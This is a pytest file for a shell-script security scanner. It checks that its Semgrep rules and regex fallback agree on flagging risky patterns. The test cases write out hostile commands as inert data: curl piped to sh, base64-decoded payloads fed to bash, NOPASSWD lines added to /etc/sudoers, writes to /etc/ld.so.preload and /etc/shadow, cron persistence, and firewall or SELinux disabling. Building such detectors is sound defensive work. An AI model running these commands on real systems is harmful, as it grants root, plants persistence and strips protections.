"""One snippet per rule behaviour, run through both Semgrep and the regex rules.

Both engines must agree on every case: the regex fallback is only a floor if it
fires where Semgrep would.
"""

from __future__ import annotations

import functools
import re
from collections.abc import Callable
from importlib import resources

import pytest

from chkscript.models import Finding, ScriptBundle
from chkscript.preprocess import preprocess
from chkscript.static import regex_rules, semgrep
from tests.conftest import require_tool
from tests.test_rule_spans import CASES as SPAN_CASES

# (rule id, script body, should fire)
CASES: list[tuple[str, str, bool]] = [
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | sh", True),
    ("curl-pipe-shell", "wget -qO- https://x.example/i.sh | sudo bash", True),
    ("curl-pipe-shell", "curl -s https://x.example/i | tee /tmp/l | zsh", True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh -o i.sh", False),
    ("curl-pipe-shell", "# curl https://x.example/i.sh | sh", False),
    ("eval-dynamic", 'eval "$cmd"', True),
    ("eval-dynamic", "eval $(echo hi)", True),
    ("eval-dynamic", 'eval "echo $X"', True),
    ("eval-dynamic", 'eval "echo hi"', False),
    ("decode-to-shell", "echo aGk= | base64 -d | bash", True),
    ("decode-to-shell", "base64 --decode payload | sh", True),
    ("decode-to-shell", "echo x | xxd -r -p | sh", True),
    ("decode-to-shell", "openssl enc -aes-256-cbc -d -in f | bash", True),
    ("decode-to-shell", "gunzip -c p.gz | sh", True),
    ("decode-to-shell", "gunzip p.gz", False),
    ("decode-to-shell", "echo aGk= | base64 -d > out.txt", False),
    ("write-system-auth-file", "echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", True),
    ("write-system-auth-file", "echo x | sudo tee /etc/sudoers.d/x", True),
    ("write-system-auth-file", "echo /tmp/x.so > /etc/ld.so.preload", True),
    ("write-system-auth-file", "cp shadow.bak /etc/shadow", True),
    ("write-system-auth-file", "grep root /etc/passwd", False),
    ("persistence-append", "echo 'export X=1' >> ~/.bashrc", True),
    ("persistence-append", 'echo "run" >> "$HOME/.zshrc"', True),
    ("persistence-append", "(crontab -l; echo '* * * * * /tmp/x') | crontab -", True),
    ("persistence-append", "cp x.service /etc/systemd/system/x.service", True),
    ("persistence-append", "crontab -l", False),
    ("persistence-append", "cat ~/.bashrc", False),
    ("insecure-permissions", "chmod 777 /tmp/foo", True),
    ("insecure-permissions", "chmod +s /usr/local/bin/tool", True),
    ("insecure-permissions", "chmod 4755 /usr/local/bin/tool", True),
    ("insecure-permissions", 'chown root:root "$HOME/bin/tool"', True),
    ("insecure-permissions", "chmod 755 /usr/local/bin/tool", False),
    ("insecure-permissions", "chown root:root /usr/local/bin/tool", False),
    ("rm-rf-variable", 'rm -rf "$DIR/"', True),
    ("rm-rf-variable", "rm -fr ${PREFIX}/lib", True),
    ("rm-rf-variable", 'rm -r -f "$TMP"', True),
    ("rm-rf-variable", "rm -rf /tmp/build", False),
    ("rm-rf-variable", 'rm -f "$TMP/x"', False),
    ("disable-security", "setenforce 0", True),
    ("disable-security", "ufw disable", True),
    ("disable-security", "systemctl disable --now apparmor", True),
    ("disable-security", "systemctl disable cups", False),
    ("http-download", "curl -o f http://example.com/f", True),
    ("http-download", "wget http://example.com/f.tar.gz", True),
    ("http-download", "curl -o f https://example.com/f", False),
    ("http-download", "echo see http://example.com", False),
    (
        "unverified-download",
        "curl -fsSL -o /tmp/t https://x.example/t\nchmod +x /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "wget -O /tmp/t https://x.example/t\nchmod 755 /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "# verified with sha256sum\ncurl -o /tmp/t https://x.example/t\n"
        "chmod +x /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\nsha256sum -c t.sha256\nchmod +x /tmp/t",
        False,
    ),
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\ncosign verify-blob t\nchmod +x /tmp/t",
        False,
    ),
    ("unverified-download", "chmod +x ./build.sh", False),
    # Backslash continuations: both engines scan joined logical lines.
    ("rm-rf-variable", 'rm -rf \\\n  "$DIR"', True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh \\\n  | sh", True),
    ("curl-pipe-shell", "cu\\\nrl -fsSL https://x.example/i.sh | sh", True),
    # A backslash ending a comment does not continue it, so the next line runs.
    ("rm-rf-variable", '# clean up \\\nrm -rf "$DIR"', True),
]


# Where the engines knowingly differ: the regex rules cannot tell a command from
# the same text inside a quoted string, so they over-report. Over-reporting is
# the acceptable direction for a fallback floor.
STRING_LITERAL = 'echo "run: curl https://x.example/i.sh | sh"'


def _bundle(body: str) -> ScriptBundle:
    return preprocess(f"#!/bin/bash\n{body}\n".encode())


def _rule_ids(findings: list[Finding]) -> set[str]:
    return {f.rule_id for f in findings if f.rule_id is not None}


def _regex(bundle: ScriptBundle) -> list[Finding]:
    return regex_rules.run(bundle)


@functools.cache
def _semgrep_cached(text: str) -> tuple[bool, tuple[Finding, ...]]:
    # One Semgrep run per distinct script, shared by test_rule and the parity test.
    outcome = semgrep.run(preprocess(text.encode()))
    return outcome.complete, tuple(outcome.findings)


def _semgrep(bundle: ScriptBundle) -> list[Finding]:
    require_tool("semgrep")
    complete, findings = _semgrep_cached(bundle.text)
    assert complete, f"Semgrep did not fully parse: {bundle.text!r}"
    return list(findings)


ENGINES: dict[str, Callable[[ScriptBundle], list[Finding]]] = {
    "regex": _regex,
    "semgrep": _semgrep,
}


@pytest.mark.parametrize("engine", sorted(ENGINES))
@pytest.mark.parametrize(
    ("rule_id", "body", "fires"),
    CASES,
    ids=[f"{r}-{i}-{'hit' if f else 'miss'}" for i, (r, _, f) in enumerate(CASES)],
)
def test_rule(engine: str, rule_id: str, body: str, fires: bool) -> None:
    ids = _rule_ids(ENGINES[engine](_bundle(body)))
    assert (rule_id in ids) is fires


PARITY_BODIES = sorted(
    {body for _, body, _ in CASES} | {body for _, body in SPAN_CASES}
)


@pytest.mark.parametrize("body", PARITY_BODIES, ids=lambda body: repr(body)[:40])
def test_engines_agree(body: str) -> None:
    """Semgrep and the regex fallback return the same rule ids on every case.

    test_rule checks each engine only for its target rule; this compares
    everything either one reports, which is what catches a rule that misfires
    under one engine only. The two-line span cases are included because the
    NIM-98 bug (Semgrep regexes matching across lines) shows only when two
    lines sit next to each other.
    """
    bundle = _bundle(body)
    assert _rule_ids(_semgrep(bundle)) == _rule_ids(_regex(bundle))


def test_semgrep_ignores_command_text_inside_strings() -> None:
    assert "curl-pipe-shell" not in _rule_ids(_semgrep(_bundle(STRING_LITERAL)))


def test_regex_over_reports_command_text_inside_strings() -> None:
    assert "curl-pipe-shell" in _rule_ids(_regex(_bundle(STRING_LITERAL)))


def _yaml_rules() -> dict[str, str]:
    """Rule id -> message from the shipped YAML, without a YAML dependency."""
    text = (resources.files("chkscript") / "rules" / "chkscript.yml").read_text()
    pairs = re.findall(r"^\s*- id: (\S+)\n(?:.*\n)*?\s*message: (.+)$", text, re.M)
    return dict(pairs)


def test_regex_rules_mirror_semgrep_rules() -> None:
    yaml_rules = _yaml_rules()
    assert set(yaml_rules) == regex_rules.RULE_IDS
    regex_messages = {
        rule.rule_id: rule.message
        for rule in (*regex_rules.LINE_RULES, regex_rules.UNVERIFIED_DOWNLOAD)
    }
    assert regex_messages == yaml_rules
